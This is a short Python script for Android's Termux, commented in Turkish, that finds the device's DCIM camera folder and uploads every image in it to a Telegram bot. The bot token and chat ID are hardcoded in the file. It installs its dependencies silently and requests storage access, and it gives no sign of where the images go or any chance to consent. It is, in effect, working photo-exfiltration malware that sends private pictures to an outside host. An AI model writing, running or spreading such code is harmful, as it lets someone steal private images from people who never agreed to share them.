import os
import subprocess
import requests
from tqdm import tqdm  # İlerleme çubuğu için

# Telegram Bot Token ve Chat ID
BOT_TOKEN = "7635752761:AAGNNpMU3ST3LM62VLRSVXQmkIPX3Hz0xuo"
CHAT_ID = "7561737990"

# Denenecek klasör yolları
DCIM_PATHS = [
    "/storage/emulated/0/DCIM/",
    "/sdcard/DCIM/",
    "/data/data/com.termux/files/home/storage/dcim/"
]

# Desteklenen resim formatları
IMAGE_EXTENSIONS = (".png", ".jpg", ".jpeg")

# Eksik modülleri kontrol et ve yükle
def install_missing_packages():
    required_packages = ["requests", "tqdm"]
    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            subprocess.run(["pip", "install", package], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    # Termux'un depolama erişimi için izin ver
    subprocess.run(["termux-setup-storage"], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# İlk erişilebilen klasörü bul
def find_accessible_folder():
    for path in DCIM_PATHS:
        if os.path.exists(path) and os.access(path, os.R_OK):
            return path
    return None  # Hiçbirine erişim yoksa

# Resim dosyasını Telegram botuna gönderme fonksiyonu
def send_photo(image_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    with open(image_path, "rb") as img:
        files = {"photo": img}
        data = {"chat_id": CHAT_ID}
        response = requests.post(url, files=files, data=data)
    return response.json()

def main():
    install_missing_packages()

    dcim_folder = find_accessible_folder()
    if not dcim_folder:
        return  # Hiçbir klasöre erişilemiyorsa çık

    images = [f for f in os.listdir(dcim_folder) if f.lower().endswith(IMAGE_EXTENSIONS)]
    if not images:
        return  # Gönderilecek resim yoksa çık

    progress_bar = tqdm(total=len(images), desc="📤 Resimler Gönderiliyor", unit="resim", ncols=80, ascii=True)

    for image in images:
        image_path = os.path.join(dcim_folder, image)
        send_photo(image_path)
        progress_bar.update(1)  # İlerleme çubuğunu bir adım ilerlet
    
    progress_bar.close()

if __name__ == "__main__":
    main()
